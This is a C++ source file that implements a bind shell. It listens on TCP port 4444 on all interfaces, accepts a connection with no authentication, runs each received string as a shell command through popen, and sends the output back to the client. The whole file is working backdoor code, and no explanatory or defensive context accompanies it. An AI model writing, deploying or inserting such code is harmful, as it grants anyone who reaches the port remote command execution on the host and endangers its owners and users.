#include <iostream>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <cstdlib>
#include <cstdio>
#include <cerrno>

void error(const char* msg) {
    perror(msg);
    exit(EXIT_FAILURE);
}

int main() {
    int server_fd, client_fd;
    struct sockaddr_in server_addr, client_addr;
    socklen_t client_len = sizeof(client_addr);
    char buffer[1024];
    ssize_t bytes_received;
    
    // Create socket
    server_fd = socket(AF_INET, SOCK_STREAM, 0);
    if (server_fd < 0) {
        error("Socket creation failed");
    }

    // Set up server address structure
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = INADDR_ANY; // Listen on all interfaces
    server_addr.sin_port = htons(4444); // Port to listen on

    // Bind socket to address
    if (bind(server_fd, (struct sockaddr*)&server_addr, sizeof(server_addr)) < 0) {
        error("Bind failed");
    }

    // Listen for incoming connections
    if (listen(server_fd, 5) < 0) {
        error("Listen failed");
    }

    std::cout << "Server is listening on port 4444...\n";

    // Accept incoming connection
    client_fd = accept(server_fd, (struct sockaddr*)&client_addr, &client_len);
    if (client_fd < 0) {
        error("Accept failed");
    }

    std::cout << "Client connected.\n";

    // Communication loop
    while (true) {
        // Clear the buffer
        memset(buffer, 0, sizeof(buffer));

        // Receive data from the client
        bytes_received = recv(client_fd, buffer, sizeof(buffer) - 1, 0);
        if (bytes_received > 0) {
            std::cout << "Received command: " << buffer << std::endl;

            // Execute the command and send the output back to the client
            FILE* pipe = popen(buffer, "r");
            if (pipe) {
                while (fgets(buffer, sizeof(buffer) - 1, pipe) != NULL) {
                    send(client_fd, buffer, strlen(buffer), 0);
                }
                pclose(pipe);
            } else {
                const char* errorMsg = "Failed to execute command.\n";
                send(client_fd, errorMsg, strlen(errorMsg), 0);
            }
        } else if (bytes_received == 0) {
            std::cout << "Client disconnected.\n";
            break;
        } else {
            error("Receive failed");
        }
    }

    // Clean up
    close(client_fd);
    close(server_fd);

    return 0;
}
